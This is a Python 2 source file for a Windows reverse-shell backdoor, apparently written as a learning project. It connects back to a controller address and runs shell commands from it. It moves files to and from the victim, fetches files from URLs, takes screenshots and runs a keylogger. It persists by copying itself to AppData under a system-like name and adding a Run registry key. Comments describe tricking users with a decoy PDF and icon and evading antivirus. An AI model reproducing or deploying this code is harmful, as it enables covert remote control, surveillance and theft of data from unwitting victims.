#!/usr/bin/python
# python 2


import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss
import threading
import keylogger


# When we compile this file to an .exe with wine make sure we have the requests library installed you can use python -m pip install requests
# Example: wine /root/.wine/drive_c/Python27/python.exe -m pip install requests
# Also pip install mss into wine
# wine /root/.wine/drive_c/Python27/python.exe -m pip install mss
# wine /root/.wine/drive_c/Python27/python.exe -m pip install pynput


def reliable_send(data):
    json_data = json.dump(data)
    sock.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'),'temp']))
    except:
        admin = "[!!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges!"

def screenshot():
    with mss() as screenshot:
        screenshot.shot()


# Downloads file from internet to target pc
def download(url):
    get_response = requests.get(url)
    # Take last part of the url as the file name.
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def make_connection():
    while True:
        time.sleep(20)
        try:
            # Public IP address of the server
            sock.connect(("192.168.1.4",54321))
            shell()
        except:
            make_connection()


def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            #break
            continue
        elif command == "exit":
            # we conduct sock.close() at the bottom of this script
            break
        elif command[:7] == "sendall":
            subprocess.Popen(command[8:],shell=True)
        elif command == "help":
            help_options = '''                  download path --> Download a file from target PC
                                upload path --> Upload a file to target PC
                                get url --> Download a file from the internet to target PC
                                start --> Start a program on the target PC
                                screenshot --> Take a screenshot of target PC
                                check --> Check if the shell has administrative priviledges
                                quit --> Exit shell
                                keylog_start --> Start keylogger
                                keylog_dump --> Download keylogger dump file'''   
            reliable_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue            
        elif command[:8] == "download":
            # rb = read bytes
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                file_data = reliable_recv()
                fin.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded file from specified URL!")
            except:
                reliable_send("[!] Failed to download file!")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to take screenshot!")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started program!")
            except:
                reliable_send("[!!] Failed to start program!")
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("Cant perform the administrator check!")
        elif command[:12] == "keylog_start":
            thread1 = threading.Thread(target=keylogger.start)
            thread1.start()
        elif command[:11] == "keylog_dump":
            fn = open(keylogger_path, "r")
            reliable_send(fn.read())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)


keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
# For windows target only as it only has appdata
location = os.environ["appdata"] + "\\windows_shell32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    # Creates registry key to make our file run after every system start up.
    # HKCU = HKEY_CURRENT_USER
    subprocess.call('reg add HKCU\Software\Microsoft\Winwdows\CurrentVersion\Run /v Backoor /t REG_SZ /d "' + location + '"', shell=True)
    # This will open an image file when we start the program to fool the user.
    '''
    file_name = sys._MEIPass + "\SomeImage.jpg"
    try:
        subprocess.Popen(file_name, shell=True)
    except:
        # Just a stub logic to potentially fool anti-virus
        number = 1
    '''
    # Need to use the --add-data path-to-file.jpg argument with pyinstalled
    # Example below
    # C:\Python27\Scripts\pyinstaller.exe reverse_backdoor.py --add-data "C:\Users\somebody\OneDrive\Desktop\some.pdf;." --onefile --noconsole --icon " "C:\Users\somebody\OneDrive\Desktop\pdf.ico"


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
make_connection()

sock.close()